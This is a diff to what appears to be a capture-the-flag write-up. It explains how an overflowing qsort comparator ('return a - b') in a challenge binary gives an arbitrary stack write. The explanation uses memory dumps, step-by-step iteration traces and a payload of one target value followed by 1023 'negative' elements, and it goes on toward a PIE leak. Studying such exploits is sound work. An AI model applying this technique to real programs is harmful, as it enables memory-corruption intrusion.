@@ -167,7 +167,115 @@ and
 
 which states that the array has to have at least `1024` bytes before the `_quicksort` path is chosen
 
-The first step then is limiting the memory of the application, I have chosen `8096` as a value and that seems to have worked. Next I think it's best to examine the `sort_function` application layout
+Now that we understand under what conditions the exploit works, I think it's time to explain how we can control the arbitrary write. Let's first take a look at our data behind the array for our application
+
+```
+0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
+0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
+0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
+0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
+0x7fffffffd800: 0x00005555555552be      0x00005555555552ed
+0x7fffffffd810: 0x000055555555531c      0x0000555555555342
+```
+
+and let's assume we want to replace the `5342` value with `5341` (a lower value), the array before the `qsort` should look like this
+
+```
+0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
+0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
+0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
+0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
+0x7fffffffd800: 0x00005555555552be      0x00005555555552ed
+0x7fffffffd810: 0x000055555555531c      0x0000555555555342
+0x7fffffffd820: 0x8000555555555341      0x8000555555555341
+...
+0x7fffffffdc10: 0x8000555555555341      0x0000555555555341
+```
+
+First thing first, we want the entire `1024` bytes to be filed, so this whole array has `128` longs ( 128 * 8 = 1024 ). For this whole exploit, one element will be the element we want with the rest being `negative elements` as I have called them
+
+As we can see, we have the value we want to replace, which has to be `lower` due to the comparison function. We also have the negative value of it. This is crucial as the exploit relays on the `return (a - b)` relationship.
+
+The next important thing is the operation. So what is going to happen is:
+
+```
+First iteration
+
+base_ptr = 0x8000555555555341
+run_ptr  = 0x0000555555555341
+tmp_ptr  = base_ptr + 127 = 0x8000555555555341 
+0x0000555555555341 - 0x8000555555555341  < 0 (INT64_MIN)
+
+tmp_ptr=tmp_ptr - 1 
+
+Second iteration
+
+base_ptr = 0x8000555555555341
+run_ptr  = 0x0000555555555341
+tmp_ptr  = base_ptr + 126 = 0x8000555555555341 
+0x0000555555555341 - 0x8000555555555341  < 0 
+
+tmp_ptr=tmp_ptr - 1 
+
+...
+
+127th iteration
+
+base_ptr = 0x8000555555555341
+run_ptr  = 0x0000555555555341
+tmp_ptr  = base_ptr =  0x8000555555555341
+
+0x0000555555555341 - 0x8000555555555341  < 0 
+tmp_ptr = tmp_ptr - 1 
+
+128th iteration 
+
+base_ptr = 0x8000555555555341
+run_ptr  = 0x0000555555555341
+tmp_ptr  = base_ptr - 1 =  0x0000555555555342
+
+0x0000555555555341 - 0x0000555555555342  < 0
+
+tmp_ptr = tmp_ptr - 1
+
+129th iteration
+
+base_ptr = 0x8000555555555341
+run_ptr  = 0x0000555555555341
+tmp_ptr  = base_ptr - 2 =  0x000055555555531c
+
+0x0000555555555341 - 0x000055555555531c  > 0
+
+the search condition finished, and it begins sorting elements
+```
+
+As we can see, the while
+
+```
+ tmp_ptr = run_ptr - size;
+ while ((*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) < 0)
+   tmp_ptr -= size;
+```
+
+has reached the ending condition, and the element sorting phase begins, making our new stack this
+
+```
+0x7fffffffd7c0: 0x0000555555556345      0x000055555555634a
+0x7fffffffd7d0: 0x000055555555604f      0x00005555555561a4
+0x7fffffffd7e0: 0x00005555555551e9      0x0000555555555218
+0x7fffffffd7f0: 0x0000555555555247      0x000055555555526d
+0x7fffffffd800: 0x00005555555552be      0x00005555555552ed
+0x7fffffffd810: 0x000055555555531c      0x0000555555555341
+0x7fffffffd820: 0x0000555555555342      0x8000555555555341
+```
+
+with the `5341` value replacing the `5342` value. This is how we can control where we want our values to be written and what values we want to be written.
+
+With all of this information, we can begin the exploit process!
+
+## PIE Leak
+
+The first step then is limiting the memory of the application, I have chosen `8096` as a value and that seems to have worked. Next I think it's best to examine the `sort_function` application stack layout
 
 ```
 0x7fffffffd7c0: 0x0000555555556345 -- %hhd     
@@ -185,8 +293,6 @@ The first step then is limiting the memory of the application, I have chosen `80
 ```
 
 with data from `0x7fffffffd820` till `0x7fffffffdc20` being user data
-
-## PIE Leak
 
 Checking the binary protections, we can see that
 
@@ -216,23 +322,7 @@ payload=[number]*1+[neg_number]*1023
 send_sort(bitType=b'1',ordered=True,count=b'1024',payload=payload)
 ```
 
-where number is the number we want to insert. This time is `0xFF`. `negNumber` doesn't return the negative number, but the number necessary for `overflow` to happen. For example, for
-
-```
-For the number 0xFF
-
-0x7f7f7f7f7f7f7fff
-
-number = 0xFF
-neg_number= 0x7F
-
-7f7f7f7f7f7f7fff
-
-7F = 127 
-7F = - 1
-
-FF - 7F = 127 -  (-1) = 127 + 1 = 128 = -128 < 0  
-```
+where number is the number we want to insert. This time is `0xFF`. `negNumber` doesn't return the negative number, but the number necessary for `overflow` to happen.
 
 After the `0xFF` overwrite, we get the following state
 
